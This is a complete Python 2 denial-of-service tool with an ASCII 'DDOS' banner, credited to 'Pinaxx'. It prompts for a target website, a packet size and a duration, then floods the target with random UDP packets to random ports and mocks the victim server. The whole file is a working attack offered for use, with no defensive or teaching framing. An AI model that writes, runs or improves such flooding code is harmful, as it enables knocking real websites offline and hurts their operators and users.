import socket
import random
import sys
import time
import os

from time import sleep

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
print ""
time.sleep(0.3)
print ""
time.sleep(0.3)
print "              .------------------..------------------..------------------..------------------."
time.sleep(0.3)
print "              | .--------------. || .--------------. || .--------------. || .--------------. |"
time.sleep(0.3)
print "              | |  ________    | || |  ________    | || |     ____     | || |    _______   | |"
time.sleep(0.3)
print "              | | |_   ___ `.  | || | |_   ___ `.  | || |   .'    `.   | || |   /  ___  |  | |"
time.sleep(0.3)
print "              | |   | |   `. \ | || |   | |   `. \ | || |  /  .--.  \  | || |  |  (__ \_|  | |"
time.sleep(0.3)
print "              | |   | |    | | | || |   | |    | | | || |  | |    | |  | || |   '.___`-.   | |"
time.sleep(0.3)
print "              | |  _| |___.' / | || |  _| |___.' / | || |  \  `--'  /  | || |  |`\____) |  | |"
time.sleep(0.3)
print "              | | |________.'  | || | |________.'  | || |   `.____.'   | || |  |_______.'  | |"
time.sleep(0.3)
print "              | |              | || |              | || |              | || |              | |"
time.sleep(0.3)
print "              | '--------------' || '--------------' || '--------------' || '--------------' |"
time.sleep(0.3)
print "              '------------------''------------------''------------------''------------------'"
time.sleep(0.3)
print ''
print ''
target = raw_input("                          Target (Enter website address to be DDoS'ed):> ")
host_ip=socket.gethostbyname(target)
print("                                         Target set ---> %s " % (target))
print("                   =====================================================================")
time.sleep(0.7)
print ""
package = input("                                         Size (MAX 65507): ")
print("                      Target to be attacked with packets of data --->  %s" % (package))
print("                   =====================================================================")
time.sleep(0.7)
print ""
duration = input("                                   Duration (0 is infinite): ")
print("                            Time duration of the attack ---> %s " % (duration))
time.sleep(0.4)
durclock = (lambda:0, time.clock)[duration > 0]
duration = (1, (durclock() + duration))[duration > 0]
packet = random._urandom(package)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("                   =====================================================================")
print ""
print("               The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
while True:
        if (durclock() < duration):
                print("                            The Flood Attack is on, the server gonna be fucked up... ;) ")
                port = random.randint(1, 65535)
                sock.sendto(packet, (target, port))
        else:
                break
print("                   =====================================================================")
print "                        The UDP flood has completed on %s for %s seconds." % (target, duration)
time.sleep(0.5)
print "                               This is normal simple DoS attack at the UDP level..."
time.sleep(0.4)
print "                                                Coded by Pinaxx ;)"
time.sleep(0.3)
print "                                     << Remember The Infected Drake (TID) >>"
time.sleep(0.2)
print "                                         Shutting down ... Goodbye ^_^ "
print("              ==============================================================================")

